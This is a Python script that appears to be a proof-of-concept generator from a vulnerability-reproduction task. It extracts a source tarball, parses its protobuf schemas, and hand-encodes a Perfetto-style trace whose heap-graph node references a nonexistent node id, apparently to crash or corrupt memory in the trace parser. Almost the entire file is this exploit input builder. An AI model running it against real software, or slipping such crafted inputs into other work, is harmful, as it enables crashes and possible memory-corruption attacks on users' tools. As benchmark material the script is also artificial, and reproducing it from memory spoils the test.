import os
import re
import tarfile
import tempfile

def _read_file(fp):
    try:
        with open(fp, 'rb') as f:
            return f.read()
    except Exception:
        return b''

def _read_text(fp):
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return ''

def _remove_comments(text):
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
    text = re.sub(r'//.*', '', text)
    return text

def _find_matching_brace(text, open_pos):
    n = len(text)
    depth = 0
    i = open_pos
    while i < n:
        ch = text[i]
        if ch == '{':
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1

class ProtoField:
    def __init__(self, label, ftype, name, number):
        self.label = label or ''
        self.type = ftype
        self.name = name
        self.number = int(number)
    def is_repeated(self):
        return self.label.strip() == 'repeated'

class ProtoMessage:
    def __init__(self, name, full_name, content):
        self.name = name
        self.full_name = full_name
        self.content = content
        self.fields = []

def _strip_nested_messages(content):
    out = []
    i = 0
    n = len(content)
    while True:
        m = re.search(r'\bmessage\s+[A-Za-z_][A-Za-z0-9_]*\s*\{', content[i:])
        if not m:
            out.append(content[i:])
            break
        start = i + m.start()
        open_pos = i + m.end() - 1
        close_pos = _find_matching_brace(content, open_pos)
        if close_pos < 0:
            out.append(content[i:])
            break
        out.append(content[i:start])
        i = close_pos + 1
    return ''.join(out)

def _parse_fields_from_content(content):
    stripped = _strip_nested_messages(content)
    fields = []
    pattern = re.compile(r'(?m)^\s*(optional|required|repeated)?\s*([A-Za-z0-9_.<>]+)\s+([A-Za-z0-9_]+)\s*=\s*([0-9]+)\s*(?:\[[^\]]*\])?\s*;')
    for m in pattern.finditer(stripped):
        label, ftype, name, number = m.groups()
        # Skip 'group' definitions disguised as fields (rare), but our regex shouldn't match them.
        fields.append(ProtoField(label, ftype, name, number))
    return fields

def _parse_messages_in_block(text, start, end, parent_full_name, messages):
    i = start
    while True:
        m = re.search(r'\bmessage\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{', text[i:end])
        if not m:
            break
        name = m.group(1)
        pos = i + m.start()
        open_pos = i + m.end() - 1
        close_pos = _find_matching_brace(text, open_pos)
        if close_pos < 0:
            break
        content = text[open_pos+1:close_pos]
        full_name = name if not parent_full_name else parent_full_name + '.' + name
        msg = ProtoMessage(name, full_name, content)
        messages[full_name] = msg
        _parse_messages_in_block(content, 0, len(content), full_name, messages)
        i = close_pos + 1

def _parse_all_protos(proto_texts):
    messages = {}
    for text in proto_texts:
        t = _remove_comments(text)
        _parse_messages_in_block(t, 0, len(t), None, messages)
    # After parsing all message blocks, parse their fields
    for msg in messages.values():
        msg.fields = _parse_fields_from_content(msg.content)
    return messages

def _encode_varint(value):
    # value is non-negative
    out = bytearray()
    v = int(value) & ((1 << 64) - 1)
    while True:
        b = v & 0x7F
        v >>= 7
        if v:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)

def _encode_zigzag(n):
    # For sint types; we use only positive
    return (n << 1) ^ (n >> 63)

def _key(field_number, wire_type):
    return _encode_varint((field_number << 3) | wire_type)

def _ld_field(field_number, payload_bytes):
    return _key(field_number, 2) + _encode_varint(len(payload_bytes)) + payload_bytes

def _varint_field(field_number, n):
    return _key(field_number, 0) + _encode_varint(n)

def _find_message_by_simple_name(messages, simple_name):
    cands = []
    for full, msg in messages.items():
        if msg.name == simple_name or full.endswith('.' + simple_name):
            cands.append(msg)
    return cands

def _find_tracepacket(messages):
    # Prefer message that ends with .TracePacket
    cands = []
    for full, msg in messages.items():
        if msg.name == 'TracePacket' or full.endswith('.TracePacket'):
            cands.append(msg)
    if not cands:
        return None
    # Prefer perfetto's trace package if multiple
    best = None
    for m in cands:
        if any(x in m.full_name.lower() for x in ['perfetto', 'trace']):
            best = m
            break
    if not best:
        best = cands[0]
    return best

def _find_trace(messages):
    cands = _find_message_by_simple_name(messages, 'Trace')
    if not cands:
        return None
    # Prefer one with field referencing TracePacket
    tp = _find_tracepacket(messages)
    if tp:
        tp_names = {tp.name, tp.full_name.split('.')[-1]}
        for msg in cands:
            for f in msg.fields:
                if f.type.split('.')[-1] in tp_names:
                    return msg
    return cands[0]

def _numeric_field_score_for_id(name):
    name_l = name.lower()
    score = 0
    if name_l == 'id':
        score += 10
    if name_l.endswith('id'):
        score += 3
    if 'node' in name_l:
        score += 2
    if 'object' in name_l:
        score += 1
    return score

def _numeric_field_score_for_to_id(name):
    name_l = name.lower()
    score = 0
    if 'to' in name_l and 'id' in name_l:
        score += 5
    if 'to_node' in name_l:
        score += 5
    if 'target' in name_l and 'id' in name_l:
        score += 4
    if 'referenc' in name_l and 'id' in name_l:
        score += 3
    if name_l.endswith('id'):
        score += 1
    if 'object' in name_l and 'id' in name_l:
        score += 1
    return score

def _is_numeric_type(tname):
    base = tname.split('<')[0]
    base = base.strip()
    return base in ('int32','int64','uint32','uint64','sint32','sint64','fixed32','fixed64','sfixed32','sfixed64','bool')

def _build_heap_graph_poc(messages):
    # Step 1: find TracePacket and HeapGraph field number
    tp = _find_tracepacket(messages)
    if not tp:
        return None
    # locate HeapGraph field in TracePacket
    heap_graph_field = None
    heap_graph_type_name = None
    for f in tp.fields:
        if 'HeapGraph' in f.type or f.type.split('.')[-1] == 'HeapGraph':
            heap_graph_field = f
            heap_graph_type_name = f.type
            break
    if not heap_graph_field:
        # fallback: search for any field whose type's simple matches any message named HeapGraph
        heap_msgs = _find_message_by_simple_name(messages, 'HeapGraph')
        if heap_msgs:
            hg_names = set([m.name for m in heap_msgs] + [m.full_name.split('.')[-1] for m in heap_msgs])
            for f in tp.fields:
                if f.type.split('.')[-1] in hg_names:
                    heap_graph_field = f
                    heap_graph_type_name = f.type
                    break
    if not heap_graph_field:
        return None

    # find the HeapGraph message definition
    hg_msg_candidates = _find_message_by_simple_name(messages, 'HeapGraph')
    hg_msg = None
    if heap_graph_type_name:
        candidate_simple = heap_graph_type_name.split('.')[-1]
        for m in hg_msg_candidates:
            if m.name == candidate_simple:
                hg_msg = m
                break
    if not hg_msg and hg_msg_candidates:
        # prefer one in profiling
        for m in hg_msg_candidates:
            if 'profil' in m.full_name.lower() or 'heap' in m.full_name.lower():
                hg_msg = m
                break
        if not hg_msg:
            hg_msg = hg_msg_candidates[0]
    if not hg_msg:
        return None

    # Step 2: locate Node message and repeated field
    # find nested node message: prefer 'Node'
    node_msg = None
    # find any message whose full_name starts with hg_msg.full_name + '.'
    prefix = hg_msg.full_name + '.'
    nested = [m for fname, m in messages.items() if fname.startswith(prefix)]
    # prefer 'Node' or contains 'Node'
    candidates_node = [m for m in nested if m.name.lower() == 'node'] or [m for m in nested if 'node' in m.name.lower()]
    if candidates_node:
        # choose the one directly under HeapGraph (depth +1)
        best = None
        for m in candidates_node:
            # Count segments
            if m.full_name.count('.') == hg_msg.full_name.count('.') + 1:
                best = m
                break
        node_msg = best or candidates_node[0]
    # find repeated Node field in HeapGraph
    node_field = None
    if node_msg:
        for f in hg_msg.fields:
            if f.is_repeated() and (f.type.split('.')[-1] == node_msg.name or f.type.endswith(node_msg.name)):
                node_field = f
                break

    # Step 3: find Reference/Edge within Node or HeapGraph
    ref_field = None
    ref_msg = None
    to_id_field = None

    if node_msg:
        # fields in Node that are repeated with type message containing 'Reference' or 'Edge' or 'Ref'
        for f in node_msg.fields:
            type_simple = f.type.split('.')[-1]
            if f.is_repeated() and (('ref' in type_simple.lower()) or ('edge' in type_simple.lower()) or ('reference' in type_simple.lower())):
                # find the corresponding submessage
                # Search prefer nested under Node or HeapGraph
                ref_candidates = []
                # exact under Node
                n_prefix = node_msg.full_name + '.'
                for _, m in messages.items():
                    if m.full_name.startswith(n_prefix) and m.name == type_simple:
                        ref_candidates.append(m)
                if not ref_candidates:
                    h_prefix = hg_msg.full_name + '.'
                    for _, m in messages.items():
                        if m.full_name.startswith(h_prefix) and m.name == type_simple:
                            ref_candidates.append(m)
                if not ref_candidates:
                    # any message named type_simple
                    for _, m in messages.items():
                        if m.name == type_simple or m.full_name.endswith('.' + type_simple):
                            ref_candidates.append(m)
                chosen = ref_candidates[0] if ref_candidates else None
                if chosen:
                    # find "to" or "target" id numeric field
                    numeric_fields = [fld for fld in chosen.fields if _is_numeric_type(fld.type)]
                    best_score = -1
                    best_field = None
                    for fld in numeric_fields:
                        sc = _numeric_field_score_for_to_id(fld.name)
                        if sc > best_score:
                            best_score = sc
                            best_field = fld
                    if best_field:
                        ref_field = f
                        ref_msg = chosen
                        to_id_field = best_field
                        break

    # fallback to edges at HeapGraph level
    edge_msg = None
    from_field = None
    to_field_edge = None
    edge_field = None
    if not (ref_field and ref_msg and to_id_field):
        # find 'Edge' message nested under HeapGraph and repeated field for it
        edge_candidates = [m for _, m in messages.items() if m.full_name.startswith(prefix) and 'edge' in m.name.lower()]
        if edge_candidates:
            # choose direct child if possible
            best_edge = None
            for m in edge_candidates:
                if m.full_name.count('.') == hg_msg.full_name.count('.') + 1:
                    best_edge = m
                    break
            edge_msg = best_edge or edge_candidates[0]
            # find repeated Edge field in HeapGraph
            for f in hg_msg.fields:
                if f.is_repeated() and (f.type.split('.')[-1] == edge_msg.name or f.type.endswith(edge_msg.name)):
                    edge_field = f
                    break
            if edge_field:
                # find numeric fields for from and to
                numeric_fields = [fld for fld in edge_msg.fields if _is_numeric_type(fld.type)]
                # choose 'from' id
                best_from = None
                best_from_score = -1
                for fld in numeric_fields:
                    name = fld.name.lower()
                    sc = 0
                    if 'from' in name and 'id' in name:
                        sc += 5
                    if 'source' in name and 'id' in name:
                        sc += 4
                    if name.endswith('id'):
                        sc += 1
                    if sc > best_from_score:
                        best_from_score = sc
                        best_from = fld
                # choose 'to' id
                best_to = None
                best_to_score = -1
                for fld in numeric_fields:
                    sc = _numeric_field_score_for_to_id(fld.name)
                    if sc > best_to_score:
                        best_to_score = sc
                        best_to = fld
                if best_from and best_to:
                    from_field = best_from
                    to_field_edge = best_to

    # Step 4: find numeric id field in Node
    id_field = None
    if node_msg:
        num_fields_node = [fld for fld in node_msg.fields if _is_numeric_type(fld.type)]
        best_score = -1
        best_f = None
        for fld in num_fields_node:
            sc = _numeric_field_score_for_id(fld.name)
            if sc > best_score:
                best_score = sc
                best_f = fld
        id_field = best_f

    # If no Node message or no node repeated field, we cannot build
    if not node_msg or not node_field or not id_field:
        return None

    # Build Reference message payload (if available) to point to non-existent node id
    to_missing_id = 0x7fffffffffffffff >> 30  # some large id to ensure missing, but keep varint short-ish
    if not (ref_field and ref_msg and to_id_field) and not (edge_msg and edge_field and from_field and to_field_edge):
        # Cannot build references/edges
        return None

    # Build Node bytes: includes id and a reference (if ref path) else no reference (edges are top-level)
    # Compose Reference message
    def build_reference_msg():
        payload = _varint_field(to_id_field.number, to_missing_id)
        return payload

    def build_node_msg():
        node_payload = bytearray()
        node_payload += _varint_field(id_field.number, 1)
        # add a reference if available
        if ref_field and ref_msg and to_id_field:
            ref_payload = build_reference_msg()
            node_payload += _ld_field(ref_field.number, ref_payload)
        return bytes(node_payload)

    # Build HeapGraph: repeated Node
    hg_payload = bytearray()
    node_bytes = build_node_msg()
    hg_payload += _ld_field(node_field.number, node_bytes)
    # if using edge path, add one edge referencing missing id
    if (edge_msg and edge_field and from_field and to_field_edge) and not (ref_field and ref_msg and to_id_field):
        edge_payload = bytearray()
        edge_payload += _varint_field(from_field.number, 1)
        edge_payload += _varint_field(to_field_edge.number, to_missing_id)
        hg_payload += _ld_field(edge_field.number, bytes(edge_payload))
    return int(heap_graph_field.number), bytes(hg_payload)

def _build_trace_with_packet(messages, heap_graph_field_number, heap_graph_payload):
    # Build TracePacket with heap_graph field
    tp_payload = _ld_field(heap_graph_field_number, heap_graph_payload)
    # Optionally include minimal timestamp or sequence: not necessary
    # Build Trace: repeated packet field referencing TracePacket
    # Determine Trace message and packet field number
    trace_msg = _find_trace(messages)
    packet_field_number = 1
    if trace_msg:
        tp_names = set()
        tp_msg = _find_tracepacket(messages)
        if tp_msg:
            tp_names.add(tp_msg.name)
            tp_names.add(tp_msg.full_name.split('.')[-1])
        chosen = None
        for f in trace_msg.fields:
            if f.is_repeated() and (f.type.split('.')[-1] in tp_names or f.name.lower() == 'packet'):
                chosen = f
                break
        if chosen:
            packet_field_number = chosen.number
    trace_payload = _ld_field(packet_field_number, tp_payload)
    return trace_payload

class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpd = tempfile.mkdtemp(prefix='ar_poc_')
        try:
            # Extract tarball
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    tf.extractall(tmpd)
            except Exception:
                # If extraction fails, return minimal bytes
                return b'A' * 140

            # Collect .proto files
            proto_texts = []
            for root, dirs, files in os.walk(tmpd):
                for fn in files:
                    if fn.endswith('.proto'):
                        proto_texts.append(_read_text(os.path.join(root, fn)))
            if not proto_texts:
                return b'A' * 140

            messages = _parse_all_protos(proto_texts)

            res = _build_heap_graph_poc(messages)
            if not res:
                return b'A' * 140
            heap_graph_field_number, heap_graph_payload = res
            trace_bytes = _build_trace_with_packet(messages, heap_graph_field_number, heap_graph_payload)
            # If too short, pad slightly to be robust
            if len(trace_bytes) < 16:
                trace_bytes += b'\x00' * (16 - len(trace_bytes))
            return trace_bytes
        finally:
            # Clean up extracted files
            try:
                for root, dirs, files in os.walk(tmpd, topdown=False):
                    for fn in files:
                        try:
                            os.remove(os.path.join(root, fn))
                        except Exception:
                            pass
                    for d in dirs:
                        try:
                            os.rmdir(os.path.join(root, d))
                        except Exception:
                            pass
                try:
                    os.rmdir(tmpd)
                except Exception:
                    pass
            except Exception:
                pass
